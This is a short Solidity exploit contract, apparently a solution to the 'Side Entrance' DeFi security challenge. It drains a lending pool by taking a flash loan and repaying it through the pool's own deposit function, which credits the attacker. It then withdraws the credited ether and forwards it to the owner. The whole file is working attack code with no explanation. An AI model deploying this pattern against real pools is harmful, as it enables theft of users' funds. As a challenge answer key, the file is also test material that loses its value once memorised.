// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface ILenderPool {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256) external;
}

contract SideEntranceHack {
    ILenderPool public pool;
    address payable owner;

    constructor(address poolAddress) {
        pool = ILenderPool(poolAddress);
        owner = payable(msg.sender);
    }
    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    function takeLoan(uint amount) external {
        pool.flashLoan(amount);
    }

    function hack() external {
        pool.withdraw();
    }

    function easyMoney() external {
        require(msg.sender == owner, "You are not the owner");
        owner.transfer(address(this).balance);
    }

    receive() external payable {}
}